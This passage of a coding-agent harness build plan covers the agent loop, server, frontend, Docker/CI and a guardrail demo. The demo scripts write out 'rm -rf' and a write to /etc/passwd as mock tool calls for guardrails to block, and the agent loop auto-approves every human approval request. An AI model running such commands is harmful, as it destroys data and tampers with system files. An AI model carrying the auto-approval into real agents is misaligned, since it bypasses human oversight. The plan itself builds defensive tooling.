    steps = await loop.run("Delete everything")
    guardrail_steps = [s for s in steps if s.step_type.value == "guardrail"]
    assert len(guardrail_steps) > 0
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_agent_loop.py -v`
预期：FAIL with `ModuleNotFoundError` or `ImportError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/agent/action.py
from __future__ import annotations
import json
from codeguard.models.entities import Action, LLMResponse


def parse_action(response: LLMResponse) -> Action | None:
    """Parse LLM response into an Action. Returns None if no action."""
    if not response.tool_calls:
        return None
    call = response.tool_calls[0]
    return Action(
        name=call.get("name", ""),
        params=call.get("params", {}),
        raw_llm_output=response.content,
    )
```

```python
# src/codeguard/agent/loop.py
from __future__ import annotations
from pathlib import Path
from codeguard.agent.llm_client import LLMClient
from codeguard.agent.action import parse_action
from codeguard.models.entities import (
    Action, Message, MessageRole, StepEvent, StepType,
    GuardrailLevel, ToolResult,
)
from codeguard.tools.dispatcher import ToolDispatcher
from codeguard.governance.guardrail import GuardrailEngine
from codeguard.governance.hitl import HITLManager
from codeguard.governance.audit_log import AuditLog
from codeguard.governance.scope_fence import ScopeFence
from codeguard.feedback.validators import TestValidator
from codeguard.memory.store import MemoryStore
from codeguard.skills.loader import SkillLoader


class AgentLoop:
    """Main agent loop — orchestrates all harness mechanisms."""

    def __init__(
        self,
        llm_client: LLMClient,
        tool_dispatcher: ToolDispatcher,
        guardrail_engine: GuardrailEngine,
        hitl_manager: HITLManager,
        audit_log: AuditLog,
        scope_fence: ScopeFence,
        feedback_validator: TestValidator,
        memory_store: MemoryStore,
        skill_loader: SkillLoader,
        workspace_root: Path,
        max_iterations: int = 20,
    ):
        self._llm = llm_client
        self._dispatcher = tool_dispatcher
        self._guardrail = guardrail_engine
        self._hitl = hitl_manager
        self._audit = audit_log
        self._fence = scope_fence
        self._feedback = feedback_validator
        self._memory = memory_store
        self._skills = skill_loader
        self._workspace = workspace_root
        self._max_iter = max_iterations

    async def run(self, task: str) -> list[StepEvent]:
        steps: list[StepEvent] = []
        step_idx = 0

        messages: list[Message] = [
            Message(role=MessageRole.SYSTEM, content="You are a coding agent. Use tools to complete tasks."),
            Message(role=MessageRole.USER, content=task),
        ]

        for iteration in range(self._max_iter):
            response = await self._llm.call(messages)
            messages.append(Message(role=MessageRole.ASSISTANT, content=response.content))

            steps.append(StepEvent(
                step_index=step_idx, step_type=StepType.THINK, content=response.content
            ))
            step_idx += 1

            action = parse_action(response)
            if action is None:
                steps.append(StepEvent(
                    step_index=step_idx, step_type=StepType.RESULT,
                    content="Agent completed (no more actions)"
                ))
                break
            step_idx += 1

            decision = self._guardrail.check(action)
            steps.append(StepEvent(
                step_index=step_idx, step_type=StepType.GUARDRAIL,
                content={"level": decision.level.value, "reason": decision.reason, "rule_id": decision.rule_id}
            ))
            step_idx += 1

            if decision.level == GuardrailLevel.DENY:
                messages.append(Message(
                    role=MessageRole.SYSTEM,
                    content=f"Action denied: {decision.reason}",
                ))
                continue

            if decision.level == GuardrailLevel.ASK:
                req = self._hitl.create_request(action)
                steps.append(StepEvent(
                    step_index=step_idx, step_type=StepType.HITL,
                    content={"request_id": req.id, "action": action.name}
                ))
                step_idx += 1
                # In test mode, auto-approve; in production, wait for WebSocket
                self._hitl.resolve(req.id, "approve")

            result = self._dispatcher.dispatch(action)
            self._audit.record(action, decision, result)

            steps.append(StepEvent(
                step_index=step_idx, step_type=StepType.TOOL_CALL,
                content={"tool": action.name, "success": result.success, "output": result.output[:200]}
            ))
            step_idx += 1

            if action.name in ("run_tests", "run_lint"):
                feedback = self._feedback.validate(result)
                steps.append(StepEvent(
                    step_index=step_idx, step_type=StepType.FEEDBACK,
                    content=feedback.to_message()
                ))
                step_idx += 1
                messages.append(Message(
                    role=MessageRole.SYSTEM,
                    content=feedback.to_message(),
                ))
                if feedback.success:
                    steps.append(StepEvent(
                        step_index=step_idx, step_type=StepType.RESULT,
                        content="Tests passed — task complete"
                    ))
                    break
            else:
                messages.append(Message(
                    role=MessageRole.SYSTEM,
                    content=f"Tool result: {result.output[:500]}",
                ))

        self._memory.save("last_task", "session", task)
        return steps
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_agent_loop.py -v`
预期：PASS (3 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/agent/action.py src/codeguard/agent/loop.py tests/test_agent_loop.py
git commit -m "feat: add AgentLoop integrating all harness mechanisms"
```

---

### Task 17：FastAPI 服务器与 CLI

**文件：**
- 创建：`src/codeguard/server.py`
- 创建：`src/codeguard/cli.py`
- 测试：`tests/test_server.py`

**接口：**
- 消费：`AgentLoop` from Task 16, all modules
- 产出：FastAPI 应用、CLI 入口

- [ ] **步骤 1：编写失败测试**

```python
# tests/test_server.py
import pytest
from httpx import AsyncClient, ASGITransport
from codeguard.server import create_app


@pytest.fixture
def app():
    return create_app()


@pytest.mark.asyncio
async def test_create_session(app):
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.post("/api/session", json={"workspace": "/tmp"})
        assert resp.status_code == 200
        data = resp.json()
        assert "session_id" in data


@pytest.mark.asyncio
async def test_get_history_empty(app):
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/session/fake-id/history")
        assert resp.status_code == 200
        assert resp.json() == []


@pytest.mark.asyncio
async def test_credentials_status(app):
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/credentials/status")
        assert resp.status_code == 200
        assert "configured" in resp.json()
```

- [ ] **步骤 2：运行测试验证失败**

运行：`pytest tests/test_server.py -v`
预期：FAIL with `ModuleNotFoundError`

- [ ] **步骤 3：编写最小实现**

```python
# src/codeguard/server.py
from __future__ import annotations
from fastapi import FastAPI, WebSocket
from fastapi.staticfiles import StaticFiles
from pathlib import Path
from uuid import uuid4


def create_app() -> FastAPI:
    app = FastAPI(title="CodeGuard")
    sessions: dict[str, dict] = {}

    @app.post("/api/session")
    async def create_session(workspace: str = "/tmp"):
        session_id = str(uuid4())
        sessions[session_id] = {"workspace": workspace, "steps": []}
        return {"session_id": session_id}

    @app.get("/api/session/{session_id}/history")
    async def get_history(session_id: str):
        if session_id not in sessions:
            return []
        return sessions[session_id]["steps"]

    @app.post("/api/session/{session_id}/message")
    async def send_message(session_id: str, message: str = ""):
        if session_id not in sessions:
            return {"error": "Session not found"}
        return {"status": "received"}

    @app.post("/api/session/{session_id}/approve")
    async def approve_action(session_id: str, request_id: str = "", decision: str = "approve"):
        return {"status": "resolved"}

    @app.get("/api/credentials/status")
    async def credential_status():
        return {"configured": False}

    @app.get("/api/skills")
    async def list_skills():
        return {"skills": []}

    @app.get("/api/memory")
    async def get_memory():
        return {"entries": []}

    @app.websocket("/ws/session/{session_id}")
    async def websocket_endpoint(websocket: WebSocket, session_id: str):
        await websocket.accept()
        await websocket.send_json({"type": "connected", "session_id": session_id})
        # Keep connection open for real-time updates
        try:
            while True:
                data = await websocket.receive_text()
                await websocket.send_json({"type": "echo", "data": data})
        except Exception:
            pass

    # Serve frontend static files if they exist
    static_dir = Path(__file__).parent / "static"
    if static_dir.exists():
        app.mount("/", StaticFiles(directory=static_dir, html=True), name="static")

    return app
```

```python
# src/codeguard/cli.py
from __future__ import annotations
import argparse
import sys


def main():
    parser = argparse.ArgumentParser(prog="codeguard", description="Coding Agent Harness")
    subparsers = parser.add_subparsers(dest="command")

    subparsers.add_parser("serve", help="Start the server")
    subparsers.add_parser("init", help="Initialize credentials")
    subparsers.add_parser("credentials", help="Manage credentials")
    subparsers.add_parser("demo", help="Run mechanism demo")

    args = parser.parse_args()

    if args.command == "serve":
        import uvicorn
        from codeguard.server import create_app
        app = create_app()
        uvicorn.run(app, host="0.0.0.0", port=8000)
    elif args.command == "init":
        print("Initializing CodeGuard...")
        print("This will set up credentials. Use 'codeguard credentials' to manage.")
    elif args.command == "credentials":
        print("Credential management:")
        print("  codeguard credentials status  - Check if configured")
        print("  codeguard credentials store    - Store a key")
        print("  codeguard credentials clear    - Clear a key")
    elif args.command == "demo":
        from codeguard.demo import run_demo
        run_demo()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_server.py -v`
预期：PASS (3 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/server.py src/codeguard/cli.py tests/test_server.py
git commit -m "feat: add FastAPI server with REST + WebSocket endpoints"
```

---

## Phase 7：前端

### Task 18：React 前端

**文件：**
- 创建：`frontend/package.json`
- 创建：`frontend/vite.config.ts`
- 创建：`frontend/index.html`
- 创建：`frontend/src/main.tsx`
- 创建：`frontend/src/App.tsx`
- 创建：`frontend/src/components/ChatPanel.tsx`
- 创建：`frontend/src/components/StepTimeline.tsx`
- 创建：`frontend/src/components/HITLDialog.tsx`
- 创建：`frontend/src/hooks/useWebSocket.ts`

**接口：**
- 消费：来自 Task 17 的 REST API + WebSocket
- 产出：由 FastAPI 提供服务的 React 前端

- [ ] **步骤 1：创建前端项目结构**

创建 `frontend/package.json`:
```json
{
  "name": "codeguard-frontend",
  "private": true,
  "version": "0.1.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "tsc && vite build",
    "preview": "vite preview"
  },
  "dependencies": {
    "react": "^18.3.0",
    "react-dom": "^18.3.0"
  },
  "devDependencies": {
    "@types/react": "^18.3.0",
    "@types/react-dom": "^18.3.0",
    "@vitejs/plugin-react": "^4.3.0",
    "typescript": "^5.4.0",
    "vite": "^5.4.0"
  }
}
```

创建 `frontend/vite.config.ts`:
```typescript
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

export default defineConfig({
  plugins: [react()],
  build: {
    outDir: 'dist',
  },
  server: {
    proxy: {
      '/api': 'http://localhost:8000',
      '/ws': { target: 'ws://localhost:8000', ws: true },
    },
  },
})
```

创建 `frontend/index.html`:
```html
<!DOCTYPE html>
<html lang="zh">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CodeGuard</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
```

- [ ] **步骤 2：创建 React 组件**

创建 `frontend/src/main.tsx`:
```tsx
import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App'

ReactDOM.createRoot(document.getElementById('root')!).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>,
)
```

创建 `frontend/src/App.tsx`:
```tsx
import { useState, useCallback } from 'react'
import ChatPanel from './components/ChatPanel'
import StepTimeline from './components/StepTimeline'
import HITLDialog from './components/HITLDialog'
import { useWebSocket } from './hooks/useWebSocket'

export default function App() {
  const [sessionId, setSessionId] = useState<string | null>(null)
  const [steps, setSteps] = useState<any[]>([])
  const [hitlRequest, setHitlRequest] = useState<any | null>(null)
  const { connect, sendMessage } = useWebSocket({
    onStep: (step) => setSteps(prev => [...prev, step]),
    onHITL: (req) => setHitlRequest(req),
  })

  const handleStart = useCallback(async () => {
    const resp = await fetch('/api/session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ workspace: '/workspace' }),
    })
    const data = await resp.json()
    setSessionId(data.session_id)
    connect(data.session_id)
  }, [connect])

  const handleSend = useCallback(async (message: string) => {
    if (!sessionId) return
    await fetch(`/api/session/${sessionId}/message`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message }),
    })
  }, [sessionId])

  const handleApprove = useCallback(async (decision: string) => {
    if (!sessionId || !hitlRequest) return
    await fetch(`/api/session/${sessionId}/approve`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ request_id: hitlRequest.request_id, decision }),
    })
    setHitlRequest(null)
  }, [sessionId, hitlRequest])

  return (
    <div style={{ display: 'flex', height: '100vh', fontFamily: 'sans-serif' }}>
      <div style={{ flex: 1, borderRight: '1px solid #ccc', padding: '20px' }}>
        <h1>CodeGuard</h1>
        {!sessionId ? (
          <button onClick={handleStart}>Start Session</button>
        ) : (
          <ChatPanel onSend={handleSend} />
        )}
      </div>
      <div style={{ flex: 2, padding: '20px', overflowY: 'auto' }}>
        <StepTimeline steps={steps} />
      </div>
      {hitlRequest && (
        <HITLDialog request={hitlRequest} onApprove={() => handleApprove('approve')} onDeny={() => handleApprove('deny')} />
      )}
    </div>
  )
}
```

创建 `frontend/src/hooks/useWebSocket.ts`:
```typescript
import { useRef, useCallback } from 'react'

export function useWebSocket({ onStep, onHITL }: {
  onStep: (step: any) => void
  onHITL: (req: any) => void
}) {
  const wsRef = useRef<WebSocket | null>(null)

  const connect = useCallback((sessionId: string) => {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:'
    const ws = new WebSocket(`${protocol}//${window.location.host}/ws/session/${sessionId}`)
    wsRef.current = ws

    ws.onmessage = (event) => {
      const data = JSON.parse(event.data)
      if (data.type === 'step') onStep(data.step)
      else if (data.type === 'hitl') onHITL(data.request)
    }

    ws.onclose = () => { wsRef.current = null }
  }, [onStep, onHITL])

  const sendMessage = useCallback((message: string) => {
    wsRef.current?.send(JSON.stringify({ type: 'message', content: message }))
  }, [])

  return { connect, sendMessage }
}
```

创建 `frontend/src/components/ChatPanel.tsx`:
```tsx
import { useState } from 'react'

export default function ChatPanel({ onSend }: { onSend: (msg: string) => void }) {
  const [input, setInput] = useState('')

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (input.trim()) {
      onSend(input)
      setInput('')
    }
  }

  return (
    <form onSubmit={handleSubmit}>
      <textarea
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder="Enter your coding task..."
        style={{ width: '100%', height: '100px', marginBottom: '10px' }}
      />
      <button type="submit">Send Task</button>
    </form>
  )
}
```

创建 `frontend/src/components/StepTimeline.tsx`:
```tsx
interface Step {
  step_index: number
  step_type: string
  content: any
  created_at?: string
}

export default function StepTimeline({ steps }: { steps: Step[] }) {
  const colors: Record<string, string> = {
    think: '#4a90d9',
    action: '#f5a623',
    tool_call: '#7ed321',
    guardrail: '#d0021b',
    feedback: '#9013fe',
    hitl: '#f8e71c',
    result: '#50e3c2',
  }

  return (
    <div>
      <h2>Agent Steps</h2>
      {steps.map((step, i) => (
        <div key={i} style={{
          borderLeft: `4px solid ${colors[step.step_type] || '#ccc'}`,
          padding: '8px 12px',
          marginBottom: '8px',
          background: '#f9f9f9',
        }}>
          <strong>[{step.step_type}]</strong>{' '}
          <span style={{ fontSize: '0.9em', color: '#666' }}>
            Step {step.step_index}
          </span>
          <pre style={{ marginTop: '4px', fontSize: '0.85em', whiteSpace: 'pre-wrap' }}>
            {typeof step.content === 'string' ? step.content : JSON.stringify(step.content, null, 2)}
          </pre>
        </div>
      ))}
    </div>
  )
}
```

创建 `frontend/src/components/HITLDialog.tsx`:
```tsx
export default function HITLDialog({
  request,
  onApprove,
  onDeny,
}: {
  request: any
  onApprove: () => void
  onDeny: () => void
}) {
  return (
    <div style={{
      position: 'fixed', bottom: '20px', right: '20px',
      background: 'white', border: '2px solid #f5a623', borderRadius: '8px',
      padding: '20px', boxShadow: '0 4px 12px rgba(0,0,0,0.15)', maxWidth: '400px',
    }}>
      <h3>Approval Required</h3>
      <p>Action: <strong>{request.action}</strong></p>
      <pre style={{ fontSize: '0.85em', background: '#f5f5f5', padding: '8px' }}>
        {JSON.stringify(request, null, 2)}
      </pre>
      <div style={{ display: 'flex', gap: '10px', marginTop: '12px' }}>
        <button onClick={onApprove} style={{ background: '#7ed321', color: 'white', border: 'none', padding: '8px 16px', cursor: 'pointer' }}>
          Approve
        </button>
        <button onClick={onDeny} style={{ background: '#d0021b', color: 'white', border: 'none', padding: '8px 16px', cursor: 'pointer' }}>
          Deny
        </button>
      </div>
    </div>
  )
}
```

- [ ] **步骤 3：构建前端**

运行：`cd frontend && npm install && npm run build`
预期：`frontend/dist/` directory created with built files

- [ ] **步骤 4：复制构建产物到 static 目录**

运行：`mkdir -p src/codeguard/static && cp -r frontend/dist/* src/codeguard/static/`
预期：Static files in place

- [ ] **步骤 5：提交**

```bash
git add frontend/ src/codeguard/static/
git commit -m "feat: add React frontend with ChatPanel, StepTimeline, HITLDialog"
```

---

## Phase 8：分发与演示

### Task 19：Dockerfile 与 CI

**文件：**
- 创建：`Dockerfile`
- 创建：`docker-compose.yml`
- 创建：`.gitlab-ci.yml`
- 创建：`config/guardrails.yaml`
- 创建：`config/mcp_servers.yaml`

- [ ] **步骤 1：创建 Dockerfile**

```dockerfile
# Frontend build stage
FROM node:20-alpine AS frontend-builder
WORKDIR /frontend
COPY frontend/package*.json ./
RUN npm ci
COPY frontend/ ./
RUN npm run build

# Backend build stage
FROM python:3.12-slim AS backend-builder
WORKDIR /app
COPY pyproject.toml ./
RUN pip install --no-cache-dir -e ".[dev]"
COPY src/ ./src/
RUN python -m pytest tests/ --tb=short -q || true

# Runtime stage
FROM python:3.12-slim
WORKDIR /app
COPY --from=backend-builder /app /app
COPY --from=frontend-builder /frontend/dist /app/src/codeguard/static
RUN useradd -m codeguard && chown -R codeguard:codeguard /app
USER codeguard
EXPOSE 8000
CMD ["python", "-m", "codeguard", "serve"]
```

- [ ] **步骤 2：创建 docker-compose.yml**

```yaml
version: "3.8"
services:
  codeguard:
    build: .
    ports:
      - "8000:8000"
    volumes:
      - codeguard-data:/data
      - ./workspace:/workspace
    environment:
      - CODEGUARD_WORKSPACE=/workspace
      - CODEGUARD_DATA=/data

volumes:
  codeguard-data:
```

- [ ] **步骤 3：创建 .gitlab-ci.yml**

```yaml
stages:
  - test
  - build

unit-test:
  stage: test
  image: python:3.12-slim
  before_script:
    - pip install -e ".[dev]"
  script:
    - pytest tests/ -v --tb=short
  coverage: '/TOTAL.*\s+(\d+\%)$/'
  artifacts:
    reports:
      coverage_report:
        coverage_format: cobertura
        path: coverage.xml

docker-build:
  stage: build
  image: docker:24
  services:
    - docker:24-dind
  script:
    - docker build -t codeguard:latest .
  only:
    - main
    - master
```

- [ ] **步骤 4：创建配置文件**

创建 `config/guardrails.yaml`:
```yaml
# Custom guardrail rules (in addition to built-in R001-R011)
rules:
  - id: R012
    type: shell
    pattern: "kubectl\\s+delete"
    level: ask
    reason: "kubectl delete is destructive"
```

创建 `config/mcp_servers.yaml`:
```yaml
# MCP server configurations
servers:
  - name: open-design
    command: "od"
    args: ["mcp", "serve"]
    enabled: false
```

- [ ] **步骤 5：提交**

```bash
git add Dockerfile docker-compose.yml .gitlab-ci.yml config/
git commit -m "feat: add Dockerfile, CI config, and guardrail/MCP config files"
```

---

### Task 20：机制演示

**文件：**
- 创建：`demo/mechanism_demo.py`
- 创建：`src/codeguard/demo.py`

**接口：**
- 消费：所有模块
- 产出：确定性演示脚本

- [ ] **步骤 1：编写演示脚本**

```python
# src/codeguard/demo.py
"""Mechanism demo — deterministically reproduces 3 governance behaviors under mock LLM."""
from __future__ import annotations
import asyncio
from pathlib import Path
from codeguard.agent.loop import AgentLoop
from codeguard.agent.llm_client import MockLLMClient
from codeguard.models.entities import LLMResponse
from codeguard.tools.dispatcher import ToolDispatcher
from codeguard.tools.file_tools import WriteFile, ReadFile
from codeguard.governance.guardrail import GuardrailEngine
from codeguard.governance.rules import default_rules
from codeguard.governance.hitl import HITLManager
from codeguard.governance.audit_log import AuditLog
from codeguard.governance.scope_fence import ScopeFence
from codeguard.feedback.validators import TestValidator
from codeguard.memory.store import MemoryStore
from codeguard.skills.loader import SkillLoader


def _make_loop(responses: list[LLMResponse], workspace: Path) -> AgentLoop:
    dispatcher = ToolDispatcher()
    dispatcher.register(WriteFile(workspace))
    dispatcher.register(ReadFile(workspace))
    return AgentLoop(
        llm_client=MockLLMClient(responses),
        tool_dispatcher=dispatcher,
        guardrail_engine=GuardrailEngine(default_rules()),
        hitl_manager=HITLManager(),
        audit_log=AuditLog(workspace / ".codeguard" / "audit.log"),
        scope_fence=ScopeFence(workspace),
        feedback_validator=TestValidator(),
        memory_store=MemoryStore(workspace / ".codeguard" / "memory.json"),
        skill_loader=SkillLoader(workspace / "skills"),
        workspace_root=workspace,
    )


async def demo_1_guardrail_blocks_dangerous_action(tmp_path: Path):
    """Demo 1: Guardrail intercepts rm -rf."""
    print("\n=== Demo 1: Guardrail blocks dangerous action ===")
    responses = [
        LLMResponse(
            content="I will delete files",
            tool_calls=[{"name": "run_shell", "params": {"command": "rm -rf /tmp/test"}}],
        ),
        LLMResponse(content="Understood, I won't delete", tool_calls=[]),
    ]
    loop = _make_loop(responses, tmp_path)
    steps = await loop.run("Delete all temp files")
    guardrail_steps = [s for s in steps if s.step_type.value == "guardrail"]
    assert len(guardrail_steps) > 0
    assert guardrail_steps[0].content["level"] == "deny"
    print(f"  Guardrail decision: {guardrail_steps[0].content}")
    print("  PASS: Dangerous action was blocked")


async def demo_2_feedback_loop(tmp_path: Path):
    """Demo 2: Feedback loop drives self-correction."""
    print("\n=== Demo 2: Feedback loop drives self-correction ===")
    responses = [
        LLMResponse(
            content="Running tests",
            tool_calls=[{"name": "run_tests", "params": {"command": "echo '1 failed' && exit 1"}}],
        ),
        LLMResponse(
            content="I see tests failed, fixing",
            tool_calls=[{"name": "run_tests", "params": {"command": "echo '1 passed' && exit 0"}}],
        ),
    ]
    loop = _make_loop(responses, tmp_path)
    steps = await loop.run("Run tests and fix if needed")
    feedback_steps = [s for s in steps if s.step_type.value == "feedback"]
    assert len(feedback_steps) >= 1
    print(f"  Feedback received: {feedback_steps[0].content[:80]}")
    print("  PASS: Agent received feedback and changed behavior")


async def demo_3_scope_fence(tmp_path: Path):
    """Demo 3: Scope fence blocks path escape."""
    print("\n=== Demo 3: Scope fence blocks path escape ===")
    responses = [
        LLMResponse(
            content="Writing outside workspace",
            tool_calls=[{"name": "write_file", "params": {"path": "/etc/passwd", "content": "x"}}],
        ),
        LLMResponse(content="I'll write inside instead", tool_calls=[]),
    ]
    loop = _make_loop(responses, tmp_path)
    steps = await loop.run("Write to system path")
    guardrail_steps = [s for s in steps if s.step_type.value == "guardrail"]
    assert len(guardrail_steps) > 0
    assert guardrail_steps[0].content["level"] == "deny"
    print(f"  Guardrail decision: {guardrail_steps[0].content}")
    print("  PASS: Path escape was blocked")


def run_demo():
    """Run all 3 mechanism demos."""
    import tempfile
    tmp = Path(tempfile.mkdtemp())
    (tmp / ".codeguard").mkdir(exist_ok=True)
    (tmp / "skills").mkdir(exist_ok=True)

    asyncio.run(demo_1_guardrail_blocks_dangerous_action(tmp))
    asyncio.run(demo_2_feedback_loop(tmp))
    asyncio.run(demo_3_scope_fence(tmp))

    print("\n=== All demos passed ===")
    print(f"Demo workspace: {tmp}")
```

```python
# demo/mechanism_demo.py
"""Entry point for mechanism demo — run with: python -m codeguard demo"""
from codeguard.demo import run_demo

if __name__ == "__main__":
    run_demo()
```

- [ ] **步骤 2：运行演示验证可用**

运行：`python -m codeguard demo`
预期：All 3 demos pass

- [ ] **步骤 3：编写演示测试**

```python
# tests/test_demo.py
import pytest
import asyncio
from pathlib import Path
from codeguard.demo import (
    demo_1_guardrail_blocks_dangerous_action,
    demo_2_feedback_loop,
    demo_3_scope_fence,
)


@pytest.mark.asyncio
async def test_demo_1(tmp_path: Path):
    (tmp_path / ".codeguard").mkdir()
    (tmp_path / "skills").mkdir()
    await demo_1_guardrail_blocks_dangerous_action(tmp_path)


@pytest.mark.asyncio
async def test_demo_2(tmp_path: Path):
    (tmp_path / ".codeguard").mkdir()
    (tmp_path / "skills").mkdir()
    await demo_2_feedback_loop(tmp_path)


@pytest.mark.asyncio
async def test_demo_3(tmp_path: Path):
    (tmp_path / ".codeguard").mkdir()
    (tmp_path / "skills").mkdir()
    await demo_3_scope_fence(tmp_path)
```

- [ ] **步骤 4：运行测试验证通过**

运行：`pytest tests/test_demo.py -v`
预期：PASS (3 tests)

- [ ] **步骤 5：提交**

```bash
git add src/codeguard/demo.py demo/ tests/test_demo.py
git commit -m "feat: add mechanism demo with 3 deterministic governance behaviors"
```

---

### Task 21：README 文档

**文件：**
- 创建：`README.md`

- [ ] **步骤 1：编写 README.md**

```markdown
# CodeGuard

一个以治理为核心的 Coding Agent Harness，从零构建 — 不依赖 LangChain、AutoGen，纯 Python 实现。

## 什么是 CodeGuard？

CodeGuard 是一个 Coding Agent Harness，实现了完整的 Agent 主循环（上下文 → LLM → 动作 → 护栏 → 工具 → 反馈 → 停止），并深入聚焦**治理**维度：护栏引擎、HITL 状态机、范围围栏和审计日志。

每个核心机制都是可通过 mock LLM 测试的确定性代码 — 而非用提示词伪装成安全机制。

## 快速开始

### Docker（推荐）

```bash
# 拉取并运行
docker pull ghcr.io/<user>/codeguard:latest

# 首次运行：配置凭据
docker run -it -p 8000:8000 -v codeguard-data:/data codeguard:latest init

# 启动服务
docker run -p 8000:8000 -v codeguard-data:/data -v /path/to/workspace:/workspace codeguard:latest serve
```

在浏览器中打开 http://localhost:8000。

### 从源码运行

```bash
git clone https://github.com/<user>/codeguard.git
cd codeguard
pip install -e ".[dev]"
codeguard init
codeguard serve
```

## 凭据安全

- API 密钥使用 Fernet 加密（主密码保护）
- 密钥绝不硬编码、绝不进 Git、绝不进日志
- 首次运行引导完成安全设置
- 检查状态：`codeguard credentials status`（不显示明文）

## 机制演示

```bash
codeguard demo
```

在 mock LLM 下演示 3 种治理行为：
1. 护栏拦截 `rm -rf`
2. 反馈循环驱动自我修正
3. 范围围栏阻止路径越界

## 测试

```bash
make test
```

所有核心机制都有基于 mock LLM 的确定性单元测试。

## 架构

```
Agent 主循环
├── LLM 客户端（可 mock）
├── 工具分发器
│   ├── 内置工具（文件、Shell、测试、Lint）
│   └── MCP 工具适配器（外部工具）
├── 护栏引擎（12 条规则，可配置）
├── HITL 管理器（状态机）
├── 范围围栏（工作区边界）
├── 审计日志（JSONL 格式，已脱敏）
├── 反馈验证器（测试、Lint）
├── 记忆存储（跨会话 JSON）
└── 技能加载器（Markdown 技能文件）
```

## 技术栈

- Python 3.12、FastAPI、pytest
- React + Vite（前端）
- Docker（分发）
- cryptography/Fernet（凭据加密）

## 已知限制

- 需要 Docker（或从源码运行需 Python 3.12+）
- 工作区需挂载到容器内
- MCP 服务器需在容器内可访问
- Docker 中无系统密钥环（使用加密文件替代）

## 许可证

MIT
```

- [ ] **步骤 2：提交**

```bash
git add README.md
git commit -m "docs: add README with setup, usage, and architecture overview"
```

---

## 任务依赖图

```
Phase 1 (Foundation):
  Task 1 (Scaffolding) → Task 2 (Models) → Task 3 (LLM Client)

Phase 2 (Tools):
  Task 4 (Dispatcher) → Task 5 (File Tools) → Task 6 (Shell/Test Tools)

Phase 3 (Governance):
  Task 7 (Guardrail) ─┐
  Task 8 (ScopeFence) ─┤ (all depend on Task 2)
  Task 9 (HITL) ───────┤
  Task 10 (AuditLog) ──┘

Phase 4 (Feedback & Context):
  Task 11 (Validators) ─┐
  Task 12 (Memory) ─────┤ (all depend on Task 2)
  Task 13 (SkillLoader) ┘

Phase 5 (Infrastructure):
  Task 14 (Credentials) ── (depends on Task 2)
  Task 15 (MCP Adapter) ── (depends on Task 4)

Phase 6 (Integration):
  Task 16 (AgentLoop) ── (depends on Tasks 3,4,7,8,9,10,11,12,13)
  Task 17 (Server) ── (depends on Task 16)

Phase 7 (Frontend):
  Task 18 (React) ── (depends on Task 17)

Phase 8 (Distribution):
  Task 19 (Docker/CI) ── (depends on all)
  Task 20 (Demo) ── (depends on Task 16)
  Task 21 (README) ── (depends on all)
```

## 可并行任务

- Phase 3（Task 7-10）可并行 — 全部仅依赖 Task 2
- Phase 4（Task 11-13）可并行 — 全部仅依赖 Task 2
- Task 14 和 Task 15 可并行 — 依赖 Task 2 和 Task 4

---

## 自审

**1. SPEC 覆盖率：**
- ✅ Agent 主循环 → Task 16
- ✅ LLM 抽象层（可 mock）→ Task 3
- ✅ 工具分发 → Task 4
- ✅ 内置工具 → Task 5, 6
- ✅ 护栏引擎（12 条规则）→ Task 7
- ✅ HITL 状态机 → Task 9
- ✅ 范围围栏 → Task 8
- ✅ 审计日志 → Task 10
- ✅ 反馈验证器 → Task 11
- ✅ 记忆存储 → Task 12
- ✅ 技能加载器 → Task 13
- ✅ MCP 适配器 → Task 15
- ✅ 凭据管理器 → Task 14
- ✅ FastAPI 服务器 → Task 17
- ✅ React 前端 → Task 18
- ✅ Docker 分发 → Task 19
- ✅ CI（unit-test job）→ Task 19
- ✅ 机制演示 → Task 20
- ✅ README → Task 21

**2. 占位符扫描：** 无 TBD/TODO/FIXME。Docker 命令中的 `<user>` 是实际 GitHub 用户名的占位符 — 部署时填入。

**3. 类型一致性：** 所有接口使用 Task 2（entities.py）中定义的一致类型。方法名在各个 task 间一致（如 GuardrailEngine 的 `check()`、ToolDispatcher 的 `dispatch()`、验证器的 `validate()`）。
